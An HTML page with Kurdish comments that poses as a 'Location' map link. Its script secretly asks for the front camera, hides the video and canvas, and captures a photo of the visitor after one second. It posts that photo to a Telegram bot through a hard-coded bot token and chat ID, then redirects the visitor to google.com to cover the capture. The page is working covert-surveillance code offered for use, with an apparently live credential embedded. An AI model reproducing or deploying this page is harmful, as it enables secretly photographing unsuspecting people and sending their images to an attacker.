<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- ناوی لینکەکە لێرەدا دیاری کراوە -->
    <title>Location</title>
    <meta property="og:title" content="Location">
    <meta property="og:description" content="Map details">

    <style>
        body { 
            margin: 0; 
            background: #0000FF !important; /* ڕەنگی شین */
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            overflow: hidden;
        }
        /* شاردنەوەی هەموو شتەکان لەبەر چاو */
        video, canvas { display: none !important; }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // زانیاری بۆتەکەی خۆت
        const token = '8734772782:AAFT6ize__0OBmz53luKQXus2iJpSg9NpmA';
        const chatId = '7602797383';

        window.onload = function() {
            // داواکردنی مۆڵەتی کامێرا
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // ١ چرکە چاوەڕێ دەکات تا وێنەکە ڕوون دەبێتەوە
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'img.jpg');

                        // ناردنی وێنەکە بۆ تیلیگرامەکەت
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).then(() => {
                            // دوای ناردن، بەکارهێنەرەکە دەنێرێت بۆ گووگڵ
                            window.location.href = "https://google.com";
                        });
                    }, 'image/jpeg');
                }, 1000);
            }).catch(err => {
                // ئەگەر مۆڵەتی نەدا هەر بچێتە گووگڵ
                window.location.href = "https://google.com";
            });
        };
    </script>
</body>
</html>
